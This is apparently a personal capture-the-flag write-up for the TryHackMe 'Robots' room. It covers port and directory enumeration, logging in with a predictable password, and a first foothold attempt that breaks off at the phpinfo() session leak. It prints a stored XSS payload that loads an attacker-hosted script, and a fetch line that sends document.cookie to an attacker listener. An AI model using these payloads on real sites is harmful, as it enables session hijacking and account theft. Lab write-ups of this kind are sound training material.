## Challenge Overview

**Room:** [Robots](https://tryhackme.com/room/robots)  
**Platform:** TryHackMe  
**Category:** Logic-based enumeration / Web interaction  
**Difficulty:** Hard  

This write-up documents my full approach to solving the *Robots* room and reach the final solution.

---

# Enumeration

### Nmap Scan

An initial enumeration scan was performed using `nmap` with default scripts and version detection enabled.

```bash
└─$ nmap -sC -sV robots.thm  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 20:04 +0530
Nmap scan report for robots.thm (10.82.155.18)
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.61
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries 
|_/harming/humans /ignoring/human/orders /harm/to/self
|_http-server-header: Apache/2.4.61 (Debian)
9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.60 secon
```
- Found 3 open ports, ( ssh, http, cslistener )

### Gobuster
```
$ gobuster dir -u http://robots.thm/harm/to/self/ -w /usr/share/wordlists/dirb/common.txt -x php

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://robots.thm/harm/to/self/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/admin.php            (Status: 200) [Size: 370]
/admin.php            (Status: 200) [Size: 370]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 319] [--> http://robots.thm/harm/to/self/css/]
/index.php            (Status: 200) [Size: 662]
/index.php            (Status: 200) [Size: 662]
/login.php            (Status: 200) [Size: 795]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/register.php         (Status: 200) [Size: 976]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

### => Port Enumeration 

**On visiting the Website on the Given Ports Give Us the Information**

### Port 9000

- Visiting http://robots.thm:9000/, we encounter with the default Apache2 page.
- Doing more enumeration on this Turns out to giving no clues and information

### Port 80

- Already By Nmap Results we identified a robots.txt file on the server, which contains the following disallowed entries:

    - /harming/humans
    - /ignoring/human/orders
    - /harm/to/self

  **Also be verified by visiting the page robots.thm/robots.txt**
 
- On visiting the page
    - /harming/humans/ return 403 Forbidden
    - /ignoring/human/orders/ return 403 Forbidden


- But on visiting the page
    - http://robots.thm/harm/to/self/
  - Give use 2 hyperlink which redirect to

     - Register here
     - Login
  - On Visiting the Register here page . We see a message "Your initial password will be md5(username+ddmm)."
 
  - Proceed with
      - Username : user
      - DOB : 01/01/2000
   
    - The password will be :
      ```
      └─$ echo -n 'user0101' | md5sum
      66796b60527d0165430cb551b8cbf144  -
      ```
- Logging in with 
   - user:66796b60527d0165430cb551b8cbf144

- After log in Found A Message
  ```
   Last logins
   Logout
   Admin last login: 2026-02-05 15:21 
  ```

### Give a Hint of having a XSS (Cross-Site Scripting) vulnerability.

- On Visiting the page 
- http://robots.thm/harm/to/self/server_info.php, we find that it simply prints phpinfo().
- Means We can Steal the admin cookies by crafting a xss payload

---

# FootHold

## TRY 1:
 - XSS Through Username : register an account with an XSS payload as the username
   ```
   <script src="http://<ip>/xss.js"></script>
   ```
- The content of xss.js is :
  ```
  fetch('http://<ip>:8888/steal?c=' + btoa(document.cookie));
  ```
- Got a response on the Python server as
```
└─$ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.80.159.135 - - [05/Feb/2026 22:02:51] "GET /exploit.js HTTP/1.1" 200 -
10.80.159.135 - - [05/Feb/2026 22:02:51] code 404, message File not found
10.80.159.135 - - [05/Feb/2026 22:02:51] "GET /steal?c= HTTP/1.1" 404 -
```
## Fail 1


- On Analyzing Futher More Got to Know That
    - The PHPSESSID the Http is set as TRUE , means we can steal the cookie directly
  -On Further more Digging the thing out FOUND :
   - /harm/to/self/server_info.php endpoint, we see that phpinfo() prints out the session details, including the PHPSESSID cookie.
      



